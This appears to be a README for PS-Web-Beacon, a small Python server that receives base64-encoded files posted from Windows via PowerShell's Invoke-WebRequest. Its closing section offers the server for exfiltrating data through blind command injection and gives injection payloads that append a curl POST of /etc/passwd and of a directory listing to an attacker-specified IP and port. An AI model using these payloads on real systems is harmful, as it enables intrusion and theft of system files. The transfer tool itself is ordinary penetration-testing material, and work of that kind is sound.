## PS-Web-Beacon

A simple http server to transfer files from windows to any other machine. This method utilises PowerShell's IWR to send a base64 encoded file as post data to a python web server, the web server then saves the base64 decoded post data to a file or to stdout

On origin

```
$b64 = [System.convert]::ToBase64String((Get-Content -Path '[FILE-PATH]' -Encoding Byte))
Invoke-WebRequest -Uri http://[<IP>]:[<PORT>] -Method POST -Body $b64
```

On destination

default port is 8000 and default output is to stdout

```
./server.py -f test.txt -p 80
./server.py
```

This server can also be used to exfiltrate data in blind command injection or such

```
127.0.0.1;curl -X POST [<IP>]:[<PORT>] -d "$(base64 /etc/passwd)"
127.0.0.1;curl -X POST [<IP>]:[<PORT>] -d "$(ls -al | base64)"
```
